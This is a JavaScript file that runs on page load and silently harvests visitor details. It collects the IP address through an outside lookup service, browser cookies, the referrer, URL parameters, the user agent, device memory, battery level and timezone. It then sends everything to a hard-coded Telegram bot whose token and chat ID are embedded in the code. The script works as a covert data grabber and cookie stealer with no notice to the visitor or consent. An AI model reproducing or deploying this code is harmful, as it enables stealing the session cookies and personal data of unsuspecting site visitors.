// Set Dataset
let DataOnUser = [];

// Function to collect data
async function collectData() {
  try {
    console.log("Fetching IP data...");
    const ipResponse = await fetch("http://ip-api.com/line/?fields=query");
    if (!ipResponse.ok) {
      const text = await ipResponse.text();
      throw new Error(`Network response was not ok: ${ipResponse.status} ${text}`);
    }

    try {
      const ipData = await ipResponse.text();
      if (!ipData) {
        throw new Error("No IP address returned");
      }
      DataOnUser.push("IP Data: " + ipData); // IP address string
      console.log("IP Data: " + ipData); // Log the IP address
    } catch (error) {
      console.error("Error processing IP data:", error.message);
    }

    // Get other user data
    try {
      let language = navigator.language;
      DataOnUser.push("Language: " + language);
    } catch (error) {
      console.error("Error fetching language:", error.message);
    }

    try {
      let languageList = navigator.languages.join(", ");
      DataOnUser.push("Preferred Languages List: " + languageList);
    } catch (error) {
      console.error("Error fetching preferred languages:", error.message);
    }

    try {
      let os = navigator.appVersion;
      DataOnUser.push("Operating System: " + os);
    } catch (error) {
      console.error("Error fetching operating system:", error.message);
    }

    try {
      let referrer = document.referrer || "No Referrer";
      DataOnUser.push("Referring Website: " + referrer);
    } catch (error) {
      console.error("Error fetching referrer:", error.message);
    }

    try {
      let time = new Date();
      DataOnUser.push("Visit Time: " + time);
    } catch (error) {
      console.error("Error fetching visit time:", error.message);
    }

    try {
      let screenResolution = `${screen.width}x${screen.height}`;
      DataOnUser.push("Screen Resolution: " + screenResolution);
    } catch (error) {
      console.error("Error fetching screen resolution:", error.message);
    }

    try {
      let cookiesBool = navigator.cookieEnabled;
      DataOnUser.push("Cookies Enabled?: " + cookiesBool);
    } catch (error) {
      console.error("Error checking cookies:", error.message);
    }

    try {
      let cookies = document.cookie || "No Cookies";
      DataOnUser.push("Cookies: " + cookies);
    } catch (error) {
      console.error("Error fetching cookies:", error.message);
    }

    try {
      let method = "GET";
      DataOnUser.push("Method: " + method);
    } catch (error) {
      console.error("Error setting request method:", error.message);
    }

    try {
      let path = window.location.pathname;
      DataOnUser.push("Request Path: " + path);
    } catch (error) {
      console.error("Error fetching request path:", error.message);
    }

    try {
      let parameters = window.location.search || "No Parameters";
      DataOnUser.push("Request Parameters: " + parameters);
    } catch (error) {
      console.error("Error fetching request parameters:", error.message);
    }

    try {
      let userAgent = navigator.userAgent;
      DataOnUser.push("User Agent: " + userAgent);
    } catch (error) {
      console.error("Error fetching user agent:", error.message);
    }

    try {
      let deviceType = /mobile/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
      DataOnUser.push("Device Type: " + deviceType);
    } catch (error) {
      console.error("Error determining device type:", error.message);
    }

    // Get battery level
    try {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        let batteryLevel = battery.level * 100 + "%";
        DataOnUser.push("Battery Level: " + batteryLevel);
      } else {
        DataOnUser.push("Battery Level: Not available");
      }
    } catch (error) {
      DataOnUser.push("Battery Level: Error fetching battery level");
      console.error("Error fetching battery level:", error.message);
    }

    // Get device memory information
    try {
      if (navigator.deviceMemory) {
        let memory = navigator.deviceMemory;
        DataOnUser.push("Device Memory: " + memory + "GB");
      } else {
        DataOnUser.push("Device Memory: Not available in this browser.");
      }
    } catch (error) {
      console.error("Error fetching device memory:", error.message);
    }

    // Get timezone
    try {
      let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      DataOnUser.push("Timezone: " + timezone);
    } catch (error) {
      console.error("Error fetching timezone:", error.message);
    }

    // Get online/offline status
    try {
      let onlineStatus = window.navigator.onLine ? "Online" : "Offline";
      DataOnUser.push("Online Status: " + onlineStatus);
    } catch (error) {
      console.error("Error fetching online status:", error.message);
    }

  } catch (error) {
    console.error("Error collecting data:", error.message);
    throw error; // Re-throw to handle in the caller
  }
}

// Send collected data to Telegram
function sendToTelegram(data) {
  try {
    const token = "6864161221:AAG-QIHhP-ecZxcKsB_PaY9yaAlW7rRBw9M"; // Your bot token
    const chatId = "6107520820"; // Your chat ID

    // Format the message for better readability
    const message = `User Data:\n` + data.map(item => `- ${item}`).join('\n'); // Each item on a new line

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          console.log('Data sent successfully');
        } else {
          console.error('Error sending data: ' + data.description);
        }
      })
      .catch(error => {
        console.error('Error sending data:', error);
      });
  } catch (error) {
    console.error("Error in sendToTelegram:", error.message);
  }
}

// Execute on page load
window.onload = async function() {
  try {
    await collectData(); // Collect all user data first
    sendToTelegram(DataOnUser); // Then send data to Telegram
  } catch (error) {
    console.error("Error executing on page load:", error.message);
  }
};

// Printing data to the console
console.log(DataOnUser);
